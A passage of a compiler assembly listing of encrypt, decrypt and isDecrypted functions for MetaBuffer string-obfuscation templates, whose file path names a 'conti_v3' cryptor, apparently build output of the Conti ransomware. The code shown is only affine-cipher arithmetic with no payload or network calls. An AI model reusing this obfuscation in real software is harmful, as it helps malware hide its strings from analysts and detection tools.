  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 61	 imul	 r8d, eax, 97		; 00000061H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 31	 add	 r8d, 49			; 00000031H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GB@$0DB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<97,49,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 0c 00 00 00	 mov	 ecx, 12
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 89	 lea	 r8d, DWORD PTR [rcx+rcx*4]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 13	 imul	 r8d, eax, 19
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 0c	 add	 r8d, 12
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BD@$0M@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<19,12,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 03 00 00 00	 mov	 ecx, 3
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 03	 add	 r8d, 3
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 6a 00 00 00	 mov	 ecx, 106		; 0000006aH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2d	 imul	 r8d, ecx, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 4f	 imul	 r8d, eax, 79		; 0000004fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 6a	 add	 r8d, 106		; 0000006aH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EP@$0GK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<79,106,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 1b 00 00 00	 mov	 ecx, 27
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1a	 imul	 r8d, ecx, 26

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z PROC ; MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 53	 imul	 r8d, eax, 83		; 00000053H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 1b	 add	 r8d, 27
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ PROC ; MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0FD@$0BL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<83,27,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 66	 sub	 eax, 102		; 00000066H
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 66	 add	 r8d, 102		; 00000066H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
